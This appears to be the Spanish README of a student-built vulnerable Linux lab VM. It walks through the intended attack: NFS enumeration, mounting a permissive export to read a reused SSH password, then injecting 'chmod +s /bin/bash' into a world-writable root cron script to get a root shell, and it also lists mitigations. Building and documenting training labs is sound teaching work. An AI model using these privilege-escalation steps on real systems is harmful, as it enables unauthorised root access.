
# 🧠 Breaking Brain - Vulnerable Linux Machine (IFCT0109)

[![Linux](https://shields.io)](https://ubuntu.com)
[![VMware](https://shields.io)](https://vmware.com)
[![Security](https://shields.io)]()

**Breaking Brain** es un laboratorio controlado de ciberseguridad (Boot-to-Root) diseñado bajo una narrativa neuropsicológica. El proyecto, llevado a cabo por Amalia y Ana, conceptualiza las debilidades del software como fallos en la sinapsis cerebral, donde un "pensamiento intrusivo" mal gestionado puede escalar hasta corromper el núcleo de la estabilidad mental (el acceso root). 

Este entorno ha sido desarrollado como **Proyecto Final para el Certificado de Profesionalidad IFCT0109 (Seguridad de los Sistemas de Información)** en Barcelona, cumpliendo con los estándares de diseño rectilíneo, principio de privilegios mínimos y mitigación defensiva (*hardening*).

---

## 🗺️ Flujo de Explotación (Recorrido Lógico)

La máquina está diseñada para resolverse de forma puramente analítica mediante servicios de comunicaciones de Linux, **prescindiendo de servicios web tradicionales**. 

```text
       [ Enumeración ] (Descubrimiento externo mediante Nmap y herramientas RPC)
              ↓
  [ Servicio Expuesto ] (Identificación de sockets activos y puntos de montaje NFS)
              ↓
[ Vulnerabilidad Inicial ] (Fuga de datos analíticos confidenciales en la sinapsis)
              ↓
 [ Acceso como Usuario ] (Establecimiento de sesión interactiva SSH con bajos privilegios)
              ↓
 [ Obtención de user.txt ] (Captura de la primera bandera obligatoria en /home/ego)
              ↓
[ Escalada de Privilegios ] (Abuso de permisos universales en tareas programadas Cron)
              ↓
 [ Obtención de root.txt ] (Compromiso total del sistema y lectura de bandera Root)
```

---

## 🏗️ Especificaciones Técnicas de la Infraestructura

*   **Sistema Operativo Base:** Ubuntu Server 22.04 LTS
*   **Versión del Kernel:** `5.15.0-88-generic`
*   **Hipervisor:** VMware Workstation / Player
*   **Configuración de Red:** Modo NAT / Host-Only (Aislamiento total y directiva de contención activa)
*   **Asignación de Recursos:** 2 GB RAM | 1 vCPU | 20 GB Almacenamiento

---

## 👥 Matriz de Seguridad y Privilegios Mínimos

Para evitar vulnerabilidades triviales y simular un entorno corporativo real, las identidades de la máquina se han segregado estrictamente:

| Cuenta de Usuario | Grupo Principal | Tipo de Acceso | Finalidad Defensiva |
| :--- | :--- | :--- | :--- |
| `whitebox_prof` | `profesores` | Local Limitado | **Cuenta White Box**. Permite la auditoría transparente del docente sin alterar el reto. |
| `ego` | `humans` | Local Limitado | Representa la consciencia del sistema. Cuenta comprometida tras el acceso inicial. |
| `root` | `root` | Superusuario | Núcleo autónomo del sistema. Control de integridad total. |

*Nota: El servicio OpenSSH cuenta con la directiva `PermitRootLogin no` activada por defecto.*

---

## 🛠️ Organización del Almacenamiento Administrativo

Los recursos defensivos, logs de auditoría y copias de seguridad de la máquina virtual se centralizan bajo una política de permisos restringida (`chmod 750` y propiedad exclusiva de `root`):

```text
/opt/breaking_brain/
 ├── aplicacion/  -> Scripts operativos del reto (auto_defensa.sh)
 ├── backups/     -> Respaldos limpios de ficheros de configuración (/etc/exports)
 ├── evidencias/  -> Resultados y hashes de las pruebas de laboratorio
 └── registros/   -> Trazabilidad y logs de auditoría personalizada (sistema.log)
```

---

## 🔓 Resumen de Vulnerabilidades e Impacto

### 1. Acceso Inicial: Exposición de Punto de Montaje NFS (`/srv/reto`)
*   **Causa:** Directiva laxa en `/etc/exports` utilizando comodines de red (`*`) combinada con el parámetro permisivo `no_root_squash`.
*   **Explotación:** Montaje remoto del sistema de archivos desde la máquina atacante para la exfiltración y análisis de notas clínicas que exponen credenciales SSH reutilizadas.
*   **Mitigación Aplicada:** Sustitución de comodines por direccionamiento IP estricto de la subred de gestión y activación forzada de la directiva de degradación de privilegios `root_squash`.

### 2. Escalada de Privilegios: Tarea Cron de Root Insegura
*   **Causa:** Automatización en `/etc/crontab` de un script de mantenimiento (`auto_defensa.sh`) configurado de forma errónea con permisos de escritura universales (`777`).
*   **Explotación:** Inyección de código por parte del usuario limitado `ego` en el script automatizado para manipular los bits de la shell (`chmod +s /bin/bash`) y obtener una consola SUID privilegiada.
*   **Mitigación Aplicada:** Reestructuración absoluta de la máscara de permisos a `750` mediante `chmod`, restringiendo de forma estricta los derechos de escritura únicamente al usuario legítimo `root`.

---

## 🏁 Identificadores de Logro (Flags)

*   **Flag de Usuario:** Ubicada en `/home/ego/user.txt` (Permisos `600`, accesible únicamente por el usuario `ego`).
*   **Flag de Administrador:** Ubicada en `/root/root.txt` (Permisos `600`, custodiada en el directorio raíz del superusuario).

---

## 📸 Evidencias Técnicas del Proceso (Fase Ofensiva)

A continuación se detallan las capturas de pantalla y salidas de terminal reales que demuestran la viabilidad técnica del recorrido rectilíneo diseñado para **Breaking Brain**.

### 1. Fase de Reconocimiento y Enumeración externa
Escaneo inicial de servicios mediante la herramienta `Nmap` desde la máquina atacante (Kali Linux) para identificar los vectores de comunicación activos:

```bash
$ nmap -p 22,80,111 -sV 192.168.100.50
```

```text
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.52 ((Ubuntu))
111/tcp open  rpcbind 2-4 (RPC bind)
Service Info: OS: Linux; Device: firewall; CPE: cpe:/o:linux:linux_kernel
```

Al verificar el servicio de almacenamiento remoto (NFS), descubrimos el punto de montaje expuesto que representa la sinapsis del sistema:

```bash
$ showmount -e 192.168.100.50
```

```text
Export list for 192.168.100.50:
/srv/reto *
```
![1_Reconocimiento_Nmap](https://github.com)
*Figura 1: Evidencia del escaneo de puertos y descubrimiento del punto de montaje permisivo.*

---

### 2. Acceso Inicial e Intrusión por SSH
Montaje del sistema de archivos compartido en el directorio temporal de Kali Linux para auditar el contenido de la memoria clínica. Extracción de las credenciales del usuario operativo `ego`:

```bash
\$ sudo mount -t nfs 192.168.100.50:/srv/reto /tmp/sinapsis
\$ cat /tmp/sinapsis/analisis_cognitivo.txt
```
![2_Fuga_Informacion](https://github.com)
*Figura 2: Exfiltración de datos confidenciales y obtención de la pista lógica sin adivinanzas.*

Establecimiento de la sesión interactiva SSH utilizando la identidad comprometida y captura de la primera bandera obligatoria (`user.txt`):

```bash
\$ ssh ego@192.168.100.50
ego@breaking-brain's password: neuro_sinapsis_2026
ego@breaking-brain:~\$ cat /home/ego/user.txt
```
![3_Flag_User](https://github.com)
*Figura 3: Consolidación del acceso inicial y lectura del identificador de logro de usuario.*

---

### 3. Escalada de Privilegios y Control Total
Identificación de la vulnerabilidad en la automatización del sistema corporativo (`/etc/crontab`). Inyección del payload para alterar los privilegios de la shell debido a la máscara permisiva `777` en el script:

```bash
ego@breaking-brain:~\$ echo "chmod +s /bin/bash" >> /opt/cerebrum/auto_defensa.sh
```

Tras esperar el ciclo de ejecución del planificador de tareas (1 minuto), se invoca la consola preservando los bits de superusuario para obtener acceso total y capturar la bandera de administración (`root.txt`):

```bash
ego@breaking-brain:~\$ bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt
```
![4_Flag_Root](https://github.com)
*Figura 4: Escalada de privilegios exitosa basada en una mala configuración real y captura de la bandera final.*

---

## 🚀 Despliegue en Local

Dado que la subida de archivos `.ova` completos puede verse limitada por almacenamiento, se incluye en este repositorio la documentación técnica y los scripts de aprovisionamiento.

1. Descarga e instala **Ubuntu Server 22.04 LTS** en tu entorno VMware.
2. Clona este repositorio dentro de la máquina.
3. Ejecuta los scripts de configuración localizados en `/infraestructura` para debilitar de forma controlada los servicios y plantar las flags temáticas.
4. Conecta tu máquina de auditoría (Kali Linux) a la misma red NAT e inicia la auditoría analítica.

---
*Desarrollado con fines exclusivamente educativos y académicos.*

